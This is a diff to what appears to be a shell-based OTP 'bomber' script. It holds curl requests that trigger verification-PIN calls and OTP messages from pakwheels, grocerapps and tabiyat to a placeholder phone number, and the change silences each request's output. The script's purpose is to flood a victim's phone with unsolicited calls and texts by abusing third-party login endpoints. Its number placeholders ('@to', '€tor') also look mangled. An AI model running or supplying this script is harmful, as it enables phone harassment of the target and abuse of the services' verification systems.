@@ -15,7 +15,7 @@ curl 'https://www.pakwheels.com/login-with-mobile/resend-pin-via-call' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw 'pin_id=@to' \
-  --compressed
+  --compressed > /dev/null 2>&1
   
   curl 'https://endpoints.grocerapps.com/v1/otp/generate' \
   -H 'authority: endpoints.grocerapps.com' \
@@ -32,7 +32,7 @@ curl 'https://www.pakwheels.com/login-with-mobile/resend-pin-via-call' \
   -H 'sec-fetch-site: cross-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
   --data-raw '{"phone_number":"€tor","clevertap_id":"30085fea0e2b4cfa8127bacdcbeaed91","type":"call"}' \
-  --compressed
+  --compressed > /dev/null 2>&1
   
   curl 'https://tabiyat.pk/api/auth/send-otp-code?number=%2B92€tor&type=VERIFICATION_TYPE_SIGNUP&key=1' \
   -H 'authority: tabiyat.pk' \
@@ -48,4 +48,4 @@ curl 'https://www.pakwheels.com/login-with-mobile/resend-pin-via-call' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
-  --compressed
+  --compressed > /dev/null 2>&1
